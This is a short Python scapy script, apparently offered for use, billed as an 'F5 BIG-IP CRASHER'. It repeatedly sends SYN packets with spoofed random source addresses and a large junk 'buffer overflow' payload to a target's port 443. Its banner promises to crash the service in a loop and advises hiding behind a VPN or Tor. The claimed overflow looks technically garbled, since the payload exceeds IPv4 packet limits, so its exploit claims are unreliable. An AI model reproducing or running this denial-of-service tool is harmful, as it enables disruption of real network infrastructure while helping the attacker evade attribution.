#!/usr/bin/env python3
from scapy.all import *
import time
import random
import sys

# --- TARGET (MODIFY THIS) ---
TARGET_IP = "0.0.0.0"  # Replace with your target's IPv4 address
TARGET_PORT = 443          # Target port (443 for HTTPS)

# --- PAYLOAD: Pure Buffer Overflow (DoS) ---
PAYLOAD = (
    b"\x41" * 60000        # 60k of 'A' to flood memory
    + b"\x00\x00\x00\x00"  # Pointer corruption
    + b"\xFF" * 5000       # Random data to break things
)

# --- Craft the malicious IPv4 packet ---
def craft_packet():
    ip = IP(
        src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",  # Spoofed source IP
        dst=TARGET_IP,
    )
    tcp = TCP(
        sport=random.randint(1024, 65535),
        dport=TARGET_PORT,
        flags="S",  # SYN flag to trigger the bug
    )
    return ip / tcp / PAYLOAD

# --- Send the malicious packet ---
def send_exploit():
    packet = craft_packet()
    print(f"[FIVEGHOST] 💥 Sending malicious IPv4 packet to {TARGET_IP} (Source IP: {packet[IP].src})...")
    send(packet, verbose=0)

# --- Attack loop (Continuous DoS) ---
if __name__ == "__main__":
    print(f"""
    ───────────────────────────────────────────────────────────────────────────────
     F5 BIG-IP CRASHER (IPv4) - CORRECTED VERSION
     Target: {TARGET_IP}
     Port: {TARGET_PORT}
     Payload: Pure Buffer Overflow (DoS)
    ───────────────────────────────────────────────────────────────────────────────
    ⚠️  This script will crash the F5 BIG-IP service in a loop via IPv4.
    ⚠️  Use a VPN/Tor to mask your IP.
    """)
    try:
        while True:
            send_exploit()
            time.sleep(0.1)  # Short delay to avoid flooding your own machine
    except KeyboardInterrupt:
        print("\n[F5] 🛑 Attack stopped by user.")
        sys.exit(0)
